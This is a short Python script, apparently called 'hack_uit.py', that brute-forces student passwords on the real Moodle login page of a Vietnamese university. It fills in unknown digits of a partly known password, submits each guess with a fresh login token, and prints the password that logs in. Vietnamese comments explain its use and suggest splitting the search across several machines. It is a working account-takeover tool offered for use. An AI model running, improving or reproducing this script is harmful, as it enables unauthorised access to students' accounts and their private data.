import re
import requests
import string
import sys

url_uit="https://courses.uit.edu.vn/login/index.php"
s=requests.session()
def get_content():
	
	content=s.get(url_uit)
	
	regex='name="logintoken" value="(?P<logintoken>.*)">'
	logintoken=re.findall(regex,content.text)
	return logintoken[0]

def Step2():
		

		pass_digit=string.digits
		location=[]
		start=int(sys.argv[1])
		end=int(sys.argv[2])
		user=sys.argv[3]
		mssv=sys.argv[4]
		sub_pass=sys.argv[5]
		for c in range(len(sub_pass)):
			if sub_pass[c]=="*":
				location.append(c)
		
		len_pass=len(location)
		for x in range(start,end):
			m_pass=""
			by_pass="0"*(len_pass-len(str(x)))+str(x)
			j=0
			for i in range(len(sub_pass)):
				
				if sub_pass[i]=="*":
					m_pass+=by_pass[j]
					j+=1
				else:
					m_pass+=sub_pass[i]
			logintoken=get_content()
			data={'anchor':"",'logintoken':logintoken,'username':mssv,'password':m_pass}	

			content_success=s.post(url_uit,data=data)
			reg_user=user
			check_user=re.findall(reg_user,content_success.text)

			if len(check_user)!=0:
				print(m_pass)
				break
			
Step2()
#Hướng dẫn : python hack_uit.py start end 'Họ và tên' MSSS password_biết_được_gần_hết :)) kí tự password không biết kí hiệu là *
# ví dụ: python hack_uit.py 0 100 'Châu Tinh Trì' 19520000 12345**34aaa
# start với end để chia khoảng cho nhiều máy dò cho nhanh
# ví dụ có 3 * thì 0 - 1000 nha 
# có 4 * thì 0 -10000


